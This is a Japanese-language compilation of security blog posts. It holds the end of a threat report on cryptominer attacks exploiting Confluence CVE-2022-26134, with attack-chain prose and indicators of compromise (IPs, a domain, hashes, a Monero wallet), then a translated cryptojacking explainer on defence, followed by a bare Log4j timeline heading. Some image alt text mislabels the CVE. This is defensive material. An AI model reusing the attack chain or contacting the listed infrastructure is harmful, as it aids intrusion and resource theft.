<p id="caption-attachment-28256">図 8: システムで実行されている checkit2.exe プロセス。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y9.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28257">図 9: システムで実行されている InstallUtil.exe プロセス。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>マルウェアは、自分自身の新しいコピーを新しい名前で [スタート] メニュー フォルダーにダウンロードします。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y10.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28258">図 10: スタートアップ フォルダーにダウンロードされた cloud.exe ファイル。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>クリプト マイナーがマシン上で実行され、システムのすべてのリソースが使い果たされます。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p id="caption-attachment-28261">図 11: 暗号ウォレットの情報。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>アタックチェーン</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":28259} -->
<figure class="wp-block-image"><img src="https://blog.checkpoint.com/wp-content/uploads/2022/06/y11.png" alt="Log4j の危険な脆弱性 CVE-2021-44228 を悪用する暗号通貨マイニング コードのエクスプロイト" class="wp-image-28259"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>どちらの攻撃シナリオも、CVE-2022-26134 の脆弱性を悪用する最初の細工された HTTP リクエストから始まります。攻撃者は、Java 実行機能を使用してコマンドを実行し、悪意のあるペイロードを被害者のマシンにダウンロードします。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>その後、悪意のあるペイロードは、影響を受ける OS に応じて実行可能ファイルをダウンロードします。両方の実行可能ファイルは、仮想通貨マイナーを実行して、被害者のリソースを自分の利益のために利用します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>攻撃者</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/">システムから抽出した a[.]oracleservice.top ドメインとクリプト ウォレットは、「 8220 ギャング</a>」と呼ばれるサイバー犯罪グループに関連しています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>チェックポイントの保護:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>IPS:<br>Atlassian Confluence のリモート コード実行 (CVE-2022-26134)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>アンチボット:<br>トロイの木馬、WIN32、XMRig</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>IOC:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>198.251.86[.]46</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>51.79.175[.]139</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>167.114.114[.]169</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>146.59.198[.]38</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>51.255.171[.]23</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>a.oracleservice[.]トップ</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>d2bae17920768883ff8ac9a8516f9708967f6c6afe2aa6da0241abf8da32456e</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>2622f6651e6eb01fc282565ccbd72caba9844d941b9d1c6e6046f68fc873d5e0</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>4e48080f37debd76af54a3231ecaf3aa254a008fae1253cdccfcc36640f955d9</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>4b8be1d23644f8cd5ea22fa4f70ee7213d56e3d73cbe1d0cc3c8e5dfafe753e0</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>モネロウォレット:<br>46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://blog.checkpoint.com/2022/12/20/is-cloud-native-security-good-enough/"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1>クリプトジャッキングの説明: 防止、検出、回復する方法</h1>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>犯罪者は、ランサムウェアのような手口と有害な Web サイトを使用して、従業員のコンピューターに暗号通貨を採掘させています。それを止めるためにできることは次のとおりです。</h3>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2><strong>クリプトジャッキングの定義</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>クリプトジャッキングとは、他人のコンピューティング リソースを不正に使用して暗号通貨をマイニングすることです。ハッカーは、乗っ取ることができるあらゆる種類のシステム (デスクトップ、サーバー、クラウド インフラストラクチャなど) をハイジャックして、仮想通貨を違法にマイニングしようとします。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>配信メカニズムに関係なく、通常、クリプトジャッキング コードはバックグラウンドで静かに動作します。彼らが気付く唯一の兆候は、パフォーマンスの低下、実行の遅れ、過熱、過剰な電力消費、異常に高いクラウド コンピューティング料金です。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>クリプトジャッキングの仕組み</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>コインマイニングは、新しい暗号通貨を流通させる、暗号通貨の世界における正当なプロセスです。このプロセスは、複雑な計算問題を最初に解決したマイナーに通貨を与えることで機能します。この問題により、暗号通貨のブロックチェーンに追加される検証済みトランザクションのブロックが完成します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>「マイナーは基本的に、監査人としての仕事に対して報酬を受け取っています。彼らはビットコイン取引の正当性を検証する作業を行っている」と、&nbsp;&nbsp;ビットコインマイニングの仕組みに関する<a href="https://www.investopedia.com/tech/how-does-bitcoin-mining-work/" rel="noreferrer noopener" target="_blank">最近のInvestopediaの説明者は詳述した。</a>「マイナーの懐を潤し、ビットコインのエコシステムをサポートすることに加えて、マイニングは別の重要な目的を果たします。それは、新しい暗号通貨を流通させる唯一の方法です。」</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通常、コイン マイニングで仮想通貨を獲得するには、大量の処理能力とエネルギーが必要です。さらに、暗号通貨のエコシステムは、マイニングをより困難にし、時間の経過とともにその報酬を減らし、マイニングの競争が激しくなるように設計されています.&nbsp;これにより、合法的な暗号通貨のコインマイニングは非常にコストのかかる作業になり、費用は常に上昇しています.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>サイバー犯罪者は、コンピューティング リソースとエネルギー リソースを盗むだけで、マイニングのオーバーヘッドを大幅に削減します。彼らはさまざまなハッキング技術を使用して、不正に計算作業を行うシステムにアクセスし、これらのハイジャックされたシステムに、ハッカーが制御するサーバーに結果を送信させます。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>クリプトジャッキングの攻撃方法</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>攻撃方法は、クリプトジャッカーの創造性によってのみ制限されますが、以下は現在使用されている最も一般的なものの一部です。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>エンドポイント攻撃</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>これまで、クリプトジャッキングは主にエンドポイントのマルウェア プレイであり、デスクトップやラップトップにマルウェアを投下するもう 1 つの金儲けの目的として存在していました。従来のクリプトジャッキング マルウェアは、ファイルレス マルウェア、フィッシング スキーム、Web サイトや Web アプリに埋め込まれた悪意のあるスクリプトなどの一般的な経路を介して配信されます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>クリプトジャッキング攻撃者がリソースを盗む最も基本的な方法は、エンドポイント ユーザーに正当に見える電子メールを送信して、コードを実行するリンクをクリックしてコンピューターにクリプトマイニング スクリプトを配置するように促すことです。これはバックグラウンドで実行され、コマンド アンド コントロール (C2) インフラストラクチャを介して結果を返します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>もう 1 つの方法は、複数の Web サイトに配信される Web サイトまたは広告にスクリプトを挿入することです。被害者が Web サイトにアクセスするか、感染した広告がブラウザに表示されると、スクリプトが自動的に実行されます。被害者のコンピュータにはコードは保存されません。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>これらの手段は依然として正当な懸念事項ですが、犯罪者は利益を拡大しようとして、クリプトジャッキングの手口に非常に高度な技術を追加しています。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>脆弱なサーバーとネットワーク デバイスをスキャンします</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>攻撃者は、対象範囲をサーバー、ネットワーク デバイス、さらには IoT デバイスにまで拡大することで、クリプトジャッキングの収益性を高めようとしています。たとえば、サーバーは通常、ありきたりのデスクトップよりも高性能であるため、特に有利なターゲットです。悪者は、Log4J などの脆弱性を含む公共のインターネットに公開されているサーバーをスキャンし、欠陥を悪用して、ハッカーのサーバーに接続されているシステムにクリプトマイニング ソフトウェアを静かにロードするため、2022 年には主要な狩猟場でもあります。多くの場合、攻撃者は最初に侵害されたシステムを使用して、クリプトジャッキングを他のネットワーク デバイスに横方向に移動させます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>LogRhythm の上級脅威調査エンジニアである Sally Vincent は、次のように述べています。「ハッカーはネットワークに侵入し、ストレージを使用して暗号をマイニングするマルウェアをインストールしています。」</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>ソフトウェア サプライ チェーンへの攻撃</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>&nbsp;サイバー犯罪者は、コード内にクリプト<a href="https://www.csoonline.com/article/3649091/npm-javascript-registry-suffers-massive-influx-of-malware-report-says.html" rel="noreferrer noopener" target="_blank">ジャッキング スクリプトが埋め込まれた悪意のあるパッケージやライブラリをオープンソース コード リポジトリにシードする</a>ことで、ソフトウェア サプライ チェーンを標的にしています&nbsp;。世界中の何百万人もの開発者がこれらのパッケージをダウンロードしているため、これらの攻撃は 2 つの方法で悪者のクリプトジャッキング インフラストラクチャを急速に拡大できます。悪意のあるパッケージを使用して、開発者システム、およびそれらが接続するネットワークとクラウド リソースを標的にして、それらを違法なクリプトマイニング リソースとして直接使用することができます。または、これらの攻撃を利用して、これらの開発者がアプリケーションのエンド ユーザーのマシンでクリプトマイニング スクリプトを実行するコンポーネントで構築しているソフトウェアを汚染する可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>クラウド インフラストラクチャの活用</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>多くのクリプトジャッキング企業は、クラウド リソースのスケーラビリティを利用して、クラウド インフラストラクチャに侵入し、さらに広範なコンピューティング プールのコレクションを利用してマイニング アクティビティを強化しています。<a href="https://services.google.com/fh/files/misc/gcat_threathorizons_brief_nov2021.pdf" rel="noreferrer noopener" target="_blank">Google のサイバーセキュリティ アクション チームが昨年秋に行った調査では、</a>侵害&nbsp;&nbsp;されたクラウド インスタンスの 86% がクリプトマイニングに使用されていることが報告されています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>「今日、攻撃者はあらゆる方法でクラウド サービスを標的にして、ますます多くの暗号通貨をマイニングしています。クラウド サービスは、ユーザーの管理されたクラウド環境を乗っ取っているかどうかにかかわらず、単一のローカル マシンよりも大規模に計算を実行できるためです。あるいは、SaaS アプリケーションを悪用して計算を実行することさえあります」と、Palo Alto Networks の上級セキュリティ研究者である Guy Arazi は&nbsp;<a href="https://www.paloaltonetworks.com/blog/security-operations/stopping-cryptojacking-attacks-with-and-without-an-agent/" rel="noreferrer noopener" target="_blank">ブログ投稿に</a>書いています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>これを行う一般的な方法の 1 つは、公開されているコンテナー API または保護されていないクラウド ストレージ バケットをスキャンし、そのアクセスを使用して、影響を受けるコンテナー インスタンスまたはクラウド サーバーにコイン マイニング ソフトウェアのロードを開始することです。攻撃は通常、API が公開されているか、認証されていないアクセスが可能なパブリック インターネットにアクセスできるサーバーを探すスキャン ソフトウェアで自動化されます。攻撃者は通常、スクリプトを使用してマイナー ペイロードを最初のシステムにドロップし、接続されたクラウド システム全体に伝播する方法を探します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>&nbsp;Cado Security のセキュリティ研究者である Matt Muir は、クラウドベースの攻撃が特に有利であることを説明する<a href="https://www.cadosecurity.com/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack/" rel="noreferrer noopener" target="_blank">ブログ投稿で</a>、「クリプトジャッキングを大規模に実行することの収益性と容易さにより、この種の攻撃は簡単に実行できるようになります」と述べています。&nbsp;「これは、ユーザーが Docker や Redis などのサービスを信頼できないネットワークに公開し続ける限り、おそらく続くでしょう。」</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>クリプトジャッキングが人気の理由</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://reasonlabs.com/reports/reasonlabs-report.pdf" rel="noreferrer noopener" target="_blank">ReasonLabs のレポート</a>によると&nbsp;&nbsp;、昨年検出されたトロイの木馬全体の 58.4% がクリプトジャッキング コイン マイナーでした。一方、SonicWall による別の調査では、2021 年がクリプトジャッキング攻撃の史上最悪の年であり、年間 9,710 万回の攻撃が記録されていることがわかりました。クリプトジャッキングは実質的にサイバー犯罪者のためにお金を鋳造しているため、これらの数字は非常に強力です。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>攻撃者が、被害者のマシンから一見無限に見える無料のコンピューティング リソースのプールで仮想通貨をマイニングできる場合、その利益は非常に大きくなります。この春、ビットコインの評価額が急落して 30,000 ドルの水準を下回ったにもかかわらず、クリプトジャッカーの不正なマージンは、彼らが採掘するものの価値が犯罪インフラのコストをはるかに上回っているため、依然としてビジネスに意味があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>実際のクリプトジャッキングの例</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3><strong>WatchDog は、Docker Engine API エンドポイントと Redis サーバーをターゲットにしています</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cado Labs のセキュリティ研究チームのハニーポットは、&nbsp;&nbsp;公開された Docker エンジン API エンドポイントと Redis サーバーを標的とし、ワームのような方法で拡散できる多段階のクリプトジャッキング攻撃を発見しました<a href="https://www.cadosecurity.com/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack/" rel="noreferrer noopener" target="_blank">。</a>この攻撃は、2021 年後半から 2022 年にかけて特に活発に行われ、多数のクリプトジャッキング キャンペーンが行われた WatchDog 攻撃グループによって実行されました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>クリプトマイニングのクロスヘアでの Alibaba ECS インスタンス</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>TeamTNT は、クリプトジャッキングの焦点をクラウド指向のサービスに大きく移した最初のハッキング グループの 1 つです。TrendMicro の研究者は 2021 年後半に、&nbsp;&nbsp;このグループが Kinsig ギャングなどのライバルとともに、アリババ エラスティック コンピューティング サービス (ECS) インスタンスにマイナーをインストールし、検出を回避するためにセキュリティ機能を無効にするクリプトジャッキング キャンペーンを実施していたことを報告しました&nbsp;<a href="https://www.trendmicro.com/en_us/research/21/k/groups-target-alibaba-ecs-instances-for-cryptojacking.html" rel="noreferrer noopener" target="_blank">。</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>マイナー ボットとバックドアは、Log4J を使用して VMware Horizo​​n サーバーを攻撃します</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Log4Shell の脆弱性は、2022 年にクリプトジャッキング攻撃者に恩恵をもたらしました。顕著な例の 1 つとして、ソフォスの研究者は今年初めに、&nbsp;<a href="https://news.sophos.com/en-us/2022/03/29/horde-of-miner-bots-and-backdoors-leveraged-log4j-to-attack-vmware-horizon-servers/" rel="noreferrer noopener" target="_blank">攻撃</a>&nbsp;者の「大群」が VMware Horizo​​n サーバーを標的にして、z0Miner、JavaX、マイナーおよび少なくとも 2 つの XMRig バリアント、Jin および Mimu 暗号通貨マイナー ボット。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>npm ライブラリを介したサプライ チェーン攻撃</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>2021 年秋、Sonatype のソフトウェア サプライ チェーン セキュリティの専門家は、世界中の開発者が使用する JavaScript パッケージ リポジトリである npm に隠れている悪意のあるクリプトマイニング パッケージについて警鐘を鳴らしました。その時点で 3 つのパッケージが見つかりました。そのうちの少なくとも 1 つは、「ua-parser-js」と呼ばれる開発者が使用する人気のある正当なライブラリになりすましたものでした。開発者が誤って悪意のあるコードをダウンロードし、ソフトウェアにインストールする可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>そのレポートの数か月後、研究者の WhiteSource (現在は Mend) は、&nbsp;&nbsp;&nbsp;npm が悪意のあるコードに群がっていることを示す追加の<a href="https://www.mend.io/npm-threat-report-for-javascript-package-registry/" rel="noreferrer noopener" target="_blank">レポートをリリースしました。これは、クリプトジャッキングやその他の悪質な動作を含む 1,300 もの悪意のあるパッケージです。</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>ルーマニアの攻撃者がクリプトマイニング マルウェアで Linux マシンを標的に</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>昨年の夏、Bitdefender は、&nbsp;&nbsp;&nbsp;Monero マイニング マルウェアを展開するために、SSH 認証情報を使用して Linux ベースのマシンを標的にしているルーマニアの脅威グループを<a href="https://www.bitdefender.com/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign" rel="noreferrer noopener" target="_blank">発見しました。</a>彼らが使用したツールは、サービスとしてのモデルで配布されていました。この例は、Linux システムのクリプトマイニング攻撃の増加傾向と思われるものの先端にありました。&nbsp;VMware が今年初めに発表した<a href="https://ir.vmware.com/websites/vmware/English/2120/us-press-release.html?airportNewsID=47b6e25a-5a8b-4189-b20d-99a6da9b1663" rel="noreferrer noopener" target="_blank">レポート</a>で&nbsp;は、特に XMRig マイニング ソフトウェアを使用して、Linux ベースのマルチクラウド環境の標的が拡大していることを詳しく説明しています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>「Linux ベースのシステムからのクリプトマイニング サンプルの多くは、XMRig アプリケーションと何らかの関係があります」とレポートは説明し、クリプトマイニング攻撃の 89% が XMRig 関連のライブラリを使用していることを示しました。「したがって、Linux バイナリ内の XMRig 固有のライブラリとモジュールが特定された場合、それは潜在的なクリプトマイニング動作の証拠である可能性があります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>CoinStomp は洗練された回避戦術を使用します</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>CoinStop は、アジアのクラウド サービス プロバイダー (CSP) を標的にしていることが最近発見された別のクリプトジャッキング キャンペーンです。これは、そのアンチフォレンジックと回避手段によって際立っていました。これらには、システムのタイムスタンプを操作するためのタイムスタンプ、システムの暗号化ポリシーの削除、リバース シェル セッションを作成するための /dev/tcp デバイス ファイルの使用が含まれると、Cado の Muir 氏は攻撃に関するレポートで説明してい&nbsp;&nbsp;ます<a href="https://www.cadosecurity.com/coinstomp-malware-family-targets-asian-cloud-service-providers/" rel="noreferrer noopener" target="_blank">。</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>倉庫で発見された暗号通貨ファーム</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>クリプトジャッカーは、処理能力だけでなく、企業のインフラストラクチャからエネルギーやネットワーク リソースを盗むために、時にはあらゆる手を尽くすことがあります。昨年、Darktrace のアナリストは&nbsp;&nbsp;、控えめな段ボール箱の中に偽装された倉庫でクリプトマイニング ファームを発見したクライアントの匿名の例を強調しました<a href="https://www.darktrace.com/en/blog/crypto-mining-malware-uncovering-a-cryptocurrency-farm-in-a-warehouse/" rel="noreferrer noopener" target="_blank">。</a>内部には、会社のネットワーク パワーに接続された複数の GPU を実行するステルス リグがありました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>クリプトジャッキングを防ぐ方法</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>エンドポイント、サーバー、クラウド リソースにまたがるマルチベクトル攻撃に進化したため、クリプトジャッキングを防止するには、組織化されたバランスの取れた防御戦略が必要です。次の手順は、エンタープライズ リソースでクリプトジャッキングが蔓延するのを防ぐのに役立ちます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>強力なエンドポイント保護を採用する:</strong>&nbsp;その基盤は、クリプトマイナーを検出できるエンドポイント保護とマルウェア対策を使用し、Web フィルターを最新の状態に保ち、ブラウザー拡張機能を管理して、ブラウザーベースのスクリプトが実行されるリスクを最小限に抑えることです。組織は理想的には、サーバーやそれを超えて拡張できるエンドポイント保護プラットフォームを探す必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>サーバー (およびその他すべて) にパッチを適用して強化します。</strong>&nbsp;クリプトジャッカーは、古い脆弱性を含む公開されたサーバーのスキャンを含め、静かに収穫できる最も簡単な成果を探す傾向があります。パッチの適用、未使用のサービスの停止、外部フットプリントの制限など、基本的なサーバーの強化は、サーバーベースの攻撃のリスクを最小限に抑えるのに大いに役立ちます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>ソフトウェア構成分析を使用します。&nbsp;</strong><a href="https://www.csoonline.com/article/3640808/software-composition-analysis-explained-and-how-it-identifies-open-source-software-risks.html" rel="noreferrer noopener" target="_blank">ソフトウェア構成分析 (SCA)</a>&nbsp;ツールは、ソフトウェア内で使用されているコンポーネントの可視性を高め、コイン マイニング スクリプトを利用するサプライ チェーン攻撃を防ぎます。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>クラウドの構成ミスを突き止めます。&nbsp;</strong>組織がクラウドでのクリプトジャッキングを阻止できる最も効果的な方法の 1 つは、クラウドとコンテナーの構成を強化することです。つまり、適切な認証なしで公共のインターネットに公開されているクラウド サービスを見つけ、公開されている API サーバーを根絶し、開発者環境に保存され、アプリケーションにハードコーディングされた資格情報やその他の秘密を排除します。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>クリプトジャッキングを検出する方法</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>クリプトジャッキングは、長期的な検出を回避するために最小限の兆候を残すように設計された、古典的な低速のサイバー攻撃です。エンドポイント保護プラットフォームとエンドポイント検出および応答テクノロジは、クリプトジャッキング攻撃を警告する上で長い道のりを歩んできましたが、悪者はこの面での回避の達人であり、不正なコイン マイナーを検出することは依然として困難であることが証明されています。以下は、クリプトジャッキングの兆候にフラグを立てるための追加の方法です。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>クリプトマイニングの兆候を探すようにヘルプ デスクをトレーニングします。</strong>&nbsp;場合によっては、ユーザー エンドポイントの最初の兆候として、コンピューターのパフォーマンスの低下に関するヘルプ デスクの苦情が急増することがあります。これは、デバイスの過熱やモバイル デバイスのバッテリー パフォーマンスの低下と同様に、さらに調査する必要があるという警告を発するはずです。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>ネットワーク監視ソリューションを展開します。</strong>&nbsp;ネットワーク監視ツールは、送信元のデバイスに関係なく、クリプトジャッキング アクティビティを示す Web トラフィックとアウトバウンド C2 トラフィックの種類を検出する強力なツールを提供します。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>「アウトバウンド接続の開始を監視しているサーバーで適切なエグレス フィルタリングがあれば、[クリプトマイニング マルウェア] を適切に検出できます」と、Archaea Energy のバイスプレジデント兼 CISO である Travis Farral は述べています。ただし、クリプトマイナーの作成者は、その検出方法を回避するようにマルウェアを作成できると警告しています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>クラウド監視とコンテナ ランタイム セキュリティを使用します。&nbsp;</strong>クラウド監視やコンテナ ランタイム セキュリティ スキャンなどの進化するツールは、未承認のクリプトマイナーの影響を受ける可能性のあるクラウド環境をさらに可視化できます。クラウド プロバイダーは、この種の可視性を自社のサービスに、場合によってはアドオンとして組み込みます。たとえば、Google Cloud は今年初めに Security Command Center を拡張し、仮想マシン脅威検出 (VMTD) と呼ばれるものを含めて、他のクラウド脅威の中でも特にクラウド内のクリプトマイニングの兆候を検出しました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>定期的な脅威ハントに参加します。&nbsp;</strong>非常に多くのクリプトジャッキング攻撃はステルスでほとんど痕跡を残さないため、組織は脅威ハンティングなどのより積極的な対策を講じて、侵害の微妙な兆候を定期的に探し出し、調査を継続する必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>LogRhythm の Vincent 氏は、次のように述べています。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>クリプトマイニング コードについて Web サイトを監視します</strong>。Farral は、クリプトジャッカーが Javascript コードの一部を Web サーバーに配置する方法を見つけていると警告しています。「サーバー自体は標的ではありませんが、Web サイト自体にアクセスする人は誰でも [感染のリスク] があります」と彼は言います。彼は、Web サーバー上のファイルの変更やページ自体の変更を定期的に監視することを推奨しています。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>クリプトジャッキング攻撃への対応方法</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>不正なクリプトマイニング アクティビティが検出された後、クリプトジャッキング攻撃への対応は、封じ込め、根絶、回復、および教訓を含む標準的なサイバー インシデント対応手順に従う必要があります。クリプトジャッキング攻撃に対応するためのヒントには、次のようなものがあります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Web 配信のスクリプトを強制終了します。&nbsp;</strong>ブラウザ内 JavaScript 攻撃の場合、クリプトマイニングが検出されれば解決策は簡単です。スクリプトを実行しているブラウザ タブを強制終了します。IT 部門は、スクリプトのソースである Web サイトの URL に注意し、会社の Web フィルターを更新してそれをブロックする必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>侵害されたコンテナ インスタンスをシャットダウンします。&nbsp;</strong>コイン マイナーによって侵害されたコンテナ インスタンスのような不変のクラウド インフラストラクチャも、感染したコンテナ インスタンスをシャットダウンして新たに開始することで簡単に処理できます。ただし、組織は、そもそもコンテナ侵害につながった根本原因を掘り下げる必要があります。これは、コンテナー ダッシュボードと資格情報が侵害された兆候を探し、接続されたクラウド リソースに侵害の兆候がないか調べることを意味します。重要なステップは、古いコンテナー イメージを置き換える新しいコンテナー イメージが同様に構成されていないことを確認することです。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>アクセス許可を減らし、API キーを再生成します。&nbsp;</strong>クラウドベースのクリプトジャッキングを根絶して完全に回復するには、組織は影響を受けるクラウド リソース (およびそれらに接続されているリソース) へのアクセス許可を減らし、API キーを再生成して、攻撃者が同じクラウド環境に戻ってこないようにする必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>学び、適応する。</strong>&nbsp;この経験を利用して、攻撃者がどのようにしてシステムを侵害できたのかをよりよく理解してください。ユーザー、ヘルプデスク、IT、および SOC アナリストのトレーニングを更新して、クリプトジャッキングの試みをより適切に識別し、それに応じて対応できるようにします。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>編集者注: 2018 年 2 月に最初に公開されたこの記事は、新しい調査、ベスト プラクティス、およびクリプトジャッキングの例を含むように更新されました。</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1>Apache Log4j の脆弱性: タイムライン</h1>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Apache Log4j の脆弱性は、世界中の組織に影響を与えています。以下は、Log4j エクスプロイトを取り巻く主要なイベントの展開のタイムラインです。</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
